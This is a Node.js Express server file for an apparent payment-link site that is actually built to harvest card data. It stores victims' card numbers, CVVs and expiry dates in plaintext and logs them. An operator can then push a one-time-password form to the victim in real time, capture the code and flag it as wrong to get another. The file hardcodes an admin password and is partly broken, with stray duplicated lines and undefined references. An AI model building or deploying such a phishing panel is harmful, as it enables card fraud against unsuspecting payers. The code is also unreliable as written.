// server.js
import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import http from 'http';
import { Server as SocketIOServer } from 'socket.io';

const app = express();
app.use(bodyParser.json());
app.use(cors());

// Serve static files from the "public" directory
app.use(express.static('public'));

// Create HTTP server and wrap the Express app
const server = http.createServer(app);

// Set up socket.io server attached to the HTTP server
const io = new SocketIOServer(server, {
  cors: {
    origin: '*', // Adjust for security as needed
    methods: ['GET', 'POST']
  }
});

// In‑memory storage for transactions and payment links
const transactions = new Map();
const paymentLinks = new Map();

// Socket.io connection listener
io.on('connection', (socket) => {
  console.log('A client connected:', socket.id);
  socket.on('join', (invoiceId) => {
    socket.join(invoiceId);
    console.log(`Socket ${socket.id} joined room ${invoiceId}`);
  });
});

// Endpoint to generate a payment link (which leads to landing.html)
// In server.js, update the payment link generation endpoint:
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;
    if (!amount || amount < 1) throw new Error('Invalid amount');
    
    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    const paymentLink = `${req.protocol}://${req.get('host')}/payment.html?pid=${invoiceId}`;
    
    paymentLinks.set(invoiceId, {
      amount: Number(amount),
      description,
      paymentLink,
      createdAt: new Date().toISOString()
    });
    
    res.json({ status: "success", paymentLink });
  } catch (err) {
    console.error('Payment link error:', err);
    res.status(400).json({ status: "error", message: err.message });
  }
});
  console.log("Payment link generated:", paymentLink);
  res.json({ status: "success", paymentLink });
});

// Endpoint to fetch payment details (for landing and payment pages)
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Payment details not found" });
  }
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

// Get transaction details (for success/fail pages)
app.get('/api/getTransactionDetails', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  res.json(txn);
});

// Get all transactions (for admin panel)
app.get('/api/transactions', (req, res) => {
  const txList = Array.from(transactions.values());
  res.json({ status: "success", transactions });
});

// Process payment details submission from main payment page
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount: amount.toString().replace(/,/g, ''),
    currency,
    cardholder,
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    timestamp: new Date().toLocaleString()
  };
  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  res.json({ status: "success", invoiceId });
});

// Admin command to show OTP for a transaction
app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  io.to(invoiceId).emit('show_otp', { invoiceId });
  res.json({ status: "success", message: "OTP form will be shown to user" });
});

// Admin command to mark OTP as wrong
app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked as wrong" });
});

// Check transaction status (polled by payment page)
app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({
      status: "show_otp",
      message: "Show OTP form to user",
      otpError: txn.otpError
    });
  }
  if (txn.redirectStatus) {
    const redirectUrl = txn.redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`;
    return res.json({ status: "redirect", redirectUrl });
  }
  res.json({ status: txn.status, otpError: txn.otpError });
});

// Submit OTP from client
app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
  res.json({ status: "success", message: "OTP received" });
});

// Admin command to update redirect status (to trigger final redirection)
app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.redirectStatus = redirectStatus;
  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
  io.to(invoiceId).emit('redirect', {
    redirectUrl: redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`
  });
  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl: redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

process.env.ADMIN_USER = 'admin';
process.env.ADMIN_PASS = 'Alex20HB@';

app.get('/payment.html', function (req, res) {
  res.sendFile(path.join(__dirname, 'payment.html'), { cacheControl: false });
});
